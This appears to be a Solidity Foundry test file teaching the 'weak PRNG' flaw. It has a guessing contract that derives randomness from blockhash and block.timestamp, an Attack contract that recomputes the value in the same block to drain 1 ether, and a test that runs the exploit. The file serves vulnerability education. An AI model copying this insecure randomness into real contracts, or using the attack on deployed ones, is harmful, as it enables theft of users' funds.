// SPDX-License-Identifier: UNLICENSED

/*
Name: Weak PRNG

In the context of Solidity, a weak Pseudo-Random Number Generator (PRNG) 
refers to the use of methods that are not sufficiently random or can be manipulated by miners
or attackers, leading to vulnerabilities in smart contracts. 
This is particularly concerning in applications that rely on randomness such this smart contract:

Impact: vulnerabilities are caused by use of functions such as block.timestamp,now,blockhashes
solution: Using external oracles such as chainlink VRF
*/
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

contract GuessRandomNumber{
    constructor() payable {}
    function guess(uint guessedNum) public{
        uint256 answer = uint256(keccak256(abi.encodePacked(blockhash(block.number-1),block.timestamp)));

        if(answer == guessedNum){
            (bool sent,) = msg.sender.call{value: 1 ether}("");
            require(sent,"Failed to send ether");

        }
    }
    
}

contract Attack{
//need to recieve ether sent
    receive() external payable {}
    function attackGuesser(GuessRandomNumber guessRandomNumber) public{
        uint256 answer = uint256(keccak256(abi.encodePacked(blockhash(block.number-1),block.timestamp
        )));

        guessRandomNumber.guess(answer);

    }

    function getBalance() public view returns(uint256){
        return address(this).balance;
    }
}

contract RandmonessTest is Test{
    GuessRandomNumber  guessContract;
    Attack attackerContract;

    function testRandomness() public{
        address victim = vm.addr(1);
        address hacker = vm.addr(2);

        vm.deal(victim, 1 ether);
        vm.prank(victim);
        guessContract = new GuessRandomNumber{value: 1 ether}();
        
        vm.startPrank(hacker);
        attackerContract = new Attack();
        console.log("Before exploiting RandomNumber Guessing contract",address(attackerContract).balance);

        attackerContract.attackGuesser(guessContract);
        console.log("Balance after exploiting RandomNumber Guessing contract",address(attackerContract).balance);

        console.log("Hacker wins 1 ether!!!");
    }

}